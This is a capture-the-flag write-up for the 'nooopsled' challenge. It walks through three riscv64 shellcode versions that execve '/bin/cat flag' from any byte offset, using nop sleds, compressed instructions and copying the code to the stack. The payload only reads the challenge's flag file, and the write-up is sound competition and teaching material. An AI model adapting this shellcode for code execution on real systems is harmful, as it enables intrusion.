# nooopsled
https://github.com/o-o-overflow/dc2020q-dc2020q-nooopsled-public
## Challenge
> Historically, shellcode was judged by what it could do. This outmoded
  way of thought was cast down in the revolution of August 2018, and a
  new Order was established: shellcode would be judged by how widely
  applicable it was to different machines. In 2019, this Order was refined:
  like all things, shellcode would be measured by how resilient it was to
  corruption.

> The time for change has come again. Shellcode must be ready for anything,
  regardless of where it's executed and *from when* it's executed. This is
  not easy, but the Order is kind. You will have some time to perfect your
  shellcoding skills.

> The Order will currently accept 85 failures. You may choose the
  architecture of the future: aarch64 or riscv64?
  What is your choice?

Basically the challenge is to write shellcode that successfully prints out the
`flag` file with execution starting at any offset within your shellcode. Failing
at the fewest number of offsets is the goal. Your shellcode must be exactly 1KB
in size. When your shellcode is executed from offset `x`, bytes `0` to `x-1` are
deleted and `x` zeros are appended to the end of your shellcode.

## Flag
`OOO{did_you_choose_the_right_architecture_for_the_job?}`

## Solution
I semi-arbitrarily chose riscv64 for this challenge

### First attempt - 784 failures
First things first, I had to write shellcode that ran `cat flag`. At this
point, all I cared about was getting something that worked for the base
case of no offset. Each instruction here was 32 bits, so my code was misaligned
and failed for three out of every four offsets in my nop sled.
```riscv64
    .global _start
    .text
_start:
    .fill 238, 4, 0x00000013    # nops

    lla s1, echo                # setup argv
    sd s1, -24(sp)
    lla s1, hi 
    sd s1, -16(sp)
    slt s1,zero,-1
    sd s1, -8(sp)

    lla a0, echo                # a0 = filename
    addi a1, sp, -24            # a1 = argv
    slt a2,zero,-1              # a2 = envp set to 0
    li a7, 221                  # execve = 221
    ecall                       # Do syscall

echo: .ascii "/bin/cat\0"
hi: .ascii "flag\0"
```

### Second attempt - 534 failures
Next, I disovered that the RISC-V instruction set has a Compressed instruction
extension that's enabled by default in qemu. This allows the processor to execute
16 bit instructions alongside its normal 32 bit instructions. This allowed my code
to be properly aligned for every other offset. 16 bit instructions
also allowed me to shrink the size of my vulnerable code and increase the size of
my nop sled.

Notes:
* I had give my assembler `-march=rv64ic` to allow it to use compressed instructions.
* You can hint to the assembler to use compressed instructions with the `c.` prefix.
  RISC-V documentation describes some compressed instructions such as `c.sdsp`
  (store double word at immediate offset from the stack pointer) that I couldn't get
  the assembler to properly recognize. However, if you use the compressed instruction's
  analogous normal instruction, the assembler will produce a 16 bit instruction.
  Positive offsets from the stack pointer were required to use the 16 bit version
  of `sd reg, imm(sp)`
* My nop sled here is `addi sp, sp, 0`
```riscv64
.global _start
    .text
_start:
    .fill 488, 2, 0x0101         # nops
    addi sp, sp, 24              # allocate stack

    jal s1, skip1                # put strings on stack
    .ascii "/bin/cat\0\0"
skip1:
    sd s1, 0(sp) 
    jal s1, skip2
    .ascii "flag\0\0"
skip2:
    sd s1, 8(sp)

    c.li s1, 0                  # terminate argv array
    sd s1, 16(sp)

    ld a0, 0(sp)                # a0 = filename
    mv a1, sp                   # a1 = argv
    c.li a2, 0                  # a2 = envp set to 0
    li a7, 221                  # execve = 221
    ecall                       # Do syscall
```

### Third solution - 75 failures
Now I needed to figure out a way for my shellcode to succeed with odd offsets.
Relative jumps with an odd immediate are impossible. Putting an odd address in
a register and jumping to that didn't work. Shifting my code by one byte while
running didn't work either.

The solution was to copy my main code to the stack and then jump to it whenever my
shellcode ran with an odd offset.
```riscv64
    .global _start
    .text
_start:
    .fill 469, 2, 0x1010
    j main                      # run normally when we're half-word aligned
    .fill 1, 2, 0x1010          # add one "10" to this padding after assembling

    # copy good code to stack and execute when we're not half-word aligned
    lla s0, end
    addi t0, s1, 52             # copying a little more than I need to, but it's fine
loop:
    lb s1, 1(s0)                # 1 offset bc we'll add one byte after assembling between lla and end
    sb s1, 0(sp)
    c.addi s0, -1               # decrement pointer to good code
    c.addi t0, -1               # decrement counter
    c.addi sp, -1               # decrement stack pointer
    bnez t0, loop
    jr sp                       # jump to stack

    .fill 1, 2, 0x1010          # remove one "10" from this padding after assembling

main:
    addi sp, sp, -24            # allocate stack

    jal s1, skip1               # put strings on stack
    .ascii "/bin/cat\0\0"
skip1:
    sd s1, 0(sp)
    jal s1, skip2
    .ascii "flag\0\0"
skip2:
    sd s1, 8(sp)

    c.li s1, 0                  # terminate argv array
    sd s1, 16(sp)

    ld a0, 0(sp)                # a0 = filename
    mv a1, sp                   # a1 = argv
    c.li a2, 0                  # a2 = envp set to 0
    li a7, 221                  # execve = 221
    ecall                       # Do syscall
end:
```

